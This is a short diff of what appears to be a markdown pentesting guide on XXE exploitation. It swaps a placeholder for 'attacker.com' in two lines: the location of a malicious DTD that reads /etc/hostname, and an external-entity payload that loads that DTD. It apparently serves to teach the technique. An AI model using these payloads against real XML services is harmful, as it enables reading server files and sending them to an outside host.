@@ -61,7 +61,7 @@
 
 **Exploitation**
 
-1. Start a web server and host on `http://YOUR-DTD-URL/example.dtd` this malicious dtd.
+1. Start a web server and host on `http://attacker.com/example.dtd` this malicious dtd.
 
 ```
 <!ENTITY % file SYSTEM "file:///etc/hostname">
@@ -73,7 +73,7 @@
 2. Add this external entity
 
 ```xml
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOUR-DTD-URL/example.dtd"> %xxe;]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/example.dtd"> %xxe;]>
 ```
 
 {% hint style="info" %}
